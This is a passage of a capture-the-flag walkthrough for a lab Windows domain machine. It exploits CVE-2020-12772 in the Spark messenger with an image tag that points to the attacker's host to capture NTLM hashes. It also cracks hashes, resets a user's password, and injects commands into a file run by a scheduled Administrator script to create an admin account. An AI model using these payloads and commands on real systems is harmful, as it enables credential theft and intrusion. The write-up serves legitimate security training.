spark_2_8_3.deb</strong><br /><img src="images/46-12.png" alt="images/46-12.png" /><br /><br />The package name is: <strong>spark-messenger</strong><br /><br /><strong><h2>Foothold</h2></strong><br /><br /><strong>Note:</strong> The Ignite Realtime <strong>Openfire Jabber server 3.10.0</strong> &amp; the executible <strong>spark</strong> suggest that the server is running an Instant Messaging System.<br />Upon Researching Further on the <strong>spark</strong>, we find that older version of the software have a known vulnerability.<br /><br />After a bit of googling I found the following CVE: <strong>CVE-2020-12772</strong>.<br />And eventually I found a Github repository with all I needed to perform the client exploitation: <strong>https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md</strong><br /><br />By sending the following payload to the user buse and listening with Responder, we can get the NTLM hash of the user clicking the link: <br /><strong>&lt;img src=&quot;MY-IP/test.jpg&quot;&gt;</strong><br /><br /><br />Lets run the <strong>spark-messenger</strong> and try to login with our credentials<br />I run spark from Desktop and Login <br /><img src="images/46-13.png" alt="images/46-13.png" /><br /><br /><img src="images/46-14.png" alt="images/46-14.png" /><br /><br /><br />Now, as per the <strong>exploit</strong>. If we message the payload <strong>&lt;img src=&quot;MY-IP/test.jpg&quot;&gt;</strong> to any user. Once the user clicks on the image link, an NTLM hash of the user is sent to our system, running the spark.<br /><br />My Payload: <br /><br /><strong>Hello,<br />I need some help. Please check the following link.<br />&lt;img src=&quot;http://10.11.72.31/test.jpg&quot;&gt;</strong><br /><br /><br /><strong>Notice:</strong><br />In Real World, we will get the NTLM of the user clicking on the link. Since, this is a CTF I guess there will be a particular user to whom we can send this, so that it will get clicked automatically for CTF Purposes.<br /><br /><strong><h3>Where to Find the Users List</h3></strong><br />Default Website Source Code:<br /><img src="images/46-15.png" alt="images/46-15.png" /><br /><br />We find a few users in the Website and thier windcorp ids. We will open the <strong>Responder</strong> and send the payload to users one by one. I found success on the user <strong>buse</strong><br /><br /><strong>Note:</strong> We can use the user&#39;s id <strong>“buse@fire.windcorp.thm”</strong> to start a conversation.<br /><br /><strong><h3>Spark</h3></strong><br />Click on Action -→ Start a Chat<br />Enter either of the above in the following field and click Ok.<br /><img src="images/46-16.png" alt="images/46-16.png" /> <br /><br /><br />Next, Start the <strong>Responder</strong> on Kali Machine on the <strong>Tunnel IP.</strong><br /><img src="images/46-17.png" alt="images/46-17.png" /><br /><br /><br />Next we send the <strong>payload</strong> by pasting it and hitting <strong>Enter</strong>.<br /><img src="images/46-18.png" alt="images/46-18.png" /><br /><br /><br />Once its sent, we check the responder.<br /><img src="images/46-19.png" alt="images/46-19.png" /><br /><br />Indeed, we got the <strong>NTLM Hash</strong> for the user <strong>buse</strong>. <br />We take the NTLM Hash to a file <strong>buse_ntlm.txt</strong> and crack it using <strong>hashcat</strong>.<br /><br /><strong>hashcat -m 5600 buse_ntlm.txt /usr/share/wordlists/rockyou.txt</strong><br /><br /><img src="images/46-20.png" alt="images/46-20.png" /><br /><br />I had already cracked it before. So it asked to add <strong>--show</strong> option instead of the <strong>wordlist</strong>.<br /><br /><br /><strong>We will check the credential as usual using crackmapexec</strong><br /><img src="images/46-21.png" alt="images/46-21.png" /><br /><br />Thus, we have correct domain credential again.<br /><br /><br /><strong>Credentials Found:</strong><br /><br /><strong>Username: buse<br />Password: uzunLM+3131</strong><br /><br /><br /><strong><h3>Shell Access</h3></strong><br />Luckily the user <strong>buse</strong> is in the <strong>“Remote Management User”</strong> group. This was confirmed, as we are able to login using <strong>Evil-WinRM</strong><br /><br /><strong>evil-winrm -i 10.10.111.3 -u buse -p &#39;uzunLM+3131&#39;</strong><br />or<br /><strong>evil-winrm -i fire.windcorp.thm -u buse -p &#39;uzunLM+3131&#39;</strong><br /><br /><img src="images/46-22.png" alt="images/46-22.png" /><br /><br /><br /><strong><h3>Important Groups And its Features</h3></strong><br /><br /><strong>Remote Management Users:</strong> Used to Access the machine remotely in shell using tools like. <strong>Evil-WinRM</strong><br /><br /><strong>Remote Desktop Users:</strong> Used to Access the RDP Session of the system using tools like. <strong>xfreerdp</strong> [But for this machine <strong>RDP</strong> port is closedd]<br /><br /><strong>Account Operators:</strong> The Account Operators group grants limited account <strong>creation</strong> privileges to a <strong>user</strong>. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.<br /><br /><strong>Note: </strong>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights <br /><br /><br /><br /><strong>Summary:</strong> With the group of user <strong>buse</strong>, we can add/modify/delete users. But, we cannot change any administrator users/groups.<br /><br />We get the flag from the Desktop of the user. <br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><img src="images/46-23.png" alt="images/46-23.png" /><br /><br />I looked in the C Drive and found a directory name <strong>scripts</strong>. It has a script and a <strong>log.txt</strong> file which has current <strong>timestamp</strong>. (Indicating its running every minute)<br /><br /><img src="images/46-24.png" alt="images/46-24.png" /><br /><br />Checking from the permissions, it seems its running as <strong>Administrator</strong><br /><br />Lets analyze the Powershell Script.<br /><img src="images/46-25.png" alt="images/46-25.png" /><br /><br />Focus on the selected snippet of the powershell script. The script gets the contents of <strong>C:\Users\brittanycr\hosts.txt</strong> using <strong>get-content</strong> &amp; then <strong>executes</strong> everything inside the file using <strong>Invoke-Expression $p</strong><br /><br />We can use this to gain Administrator access, but need to be able to access the <strong>C:\Users\brittanycr\hosts.txt</strong> file. I checked its permissions.<br /><br /><img src="images/46-26.png" alt="images/46-26.png" /><br /><br />We got access denied, which indicates that we cannot even read/view it.<br /><br /><strong>Note:</strong> As we are member of group <strong>“Account Operators&quot; </strong>we can <strong>modify</strong> <strong>user</strong> <strong>accounts</strong>.<br />Thus, i run the following command to change the password of the use <strong>brittanycr</strong><br /><br /><strong>net user brittanycr NewPassword1234 /domain</strong><br /><br /><img src="images/46-27.png" alt="images/46-27.png" /><br /><br /><strong>Note:</strong> Later i Found that the user brittanycr is not a member of <strong>“Remote Management Users” </strong>So we cannot access to shell remotely by default. <br />But, if we add the user to the <strong>“Remote Management Users”</strong> group, we can access the user shell in <strong>Evil-WinRM</strong><br /><br />However, we do not need Remote Shell for the user. We just need to add our commands in the <strong>C:\Users\brittanycr\hosts.txt</strong> file which can be done in <strong>Samba</strong>.<br /><br />Firstly, I will test the credentials as usual in <strong>crackmapexec</strong><br /><img src="images/46-28.png" alt="images/46-28.png" /><br /><br />Indeed the Password is changed.<br />Lets use <strong>smbclient</strong> to open the <strong>/Users</strong> share and replace the <strong>hosts.txt</strong> with the following.<br /><br /><img src="images/46-29.png" alt="images/46-29.png" /><br /><br />Next, we go into <strong>brittanycr</strong> directory to make the necessary changes to the file.<br /><img src="images/46-30.png" alt="images/46-30.png" /><br /><br />We check the file and replace its contents as follows:<br /><br /><strong>;net user cybex Password1234! /add;net localgroup Administrators cybex /add</strong><br /><br />Note: We are giving the commands after <strong>“;”</strong> to indicate a new command<br /><br /><strong>Contents of Modified hosts.txt</strong><br /><img src="images/46-31.png" alt="images/46-31.png" /><br /><br /><br />Next, we upload the file using <strong>samba</strong>. Then we wait for <strong>1 min</strong> for the script to run. <br /><img src="images/46-32.png" alt="images/46-32.png" /><br /><br />Once the script runs, a new user named <strong>“cybex”</strong> should be created who will be a member of <strong>Administrator group.</strong><br />We will check the user with <strong>crackmapexec</strong> and finally login with <strong>Evil-WinRM</strong><br /><br /><img src="images/46-33.png" alt="images/46-33.png" /><br /><br />Indeed a user named “<strong>cybex</strong>” is created and the <strong>(Pwn3d!) </strong>message indicates that it is an <strong>administrator</strong> account.<br /><br /><img src="images/46-34.png" alt="images/46-34.png" /><br /><br />Thus, we have Administator access to the machine.<br />We get the root flag from Administrator&#39;s Desktop and end the room.<br /><br /><br />Thanks!!</div>
</body>
</html>
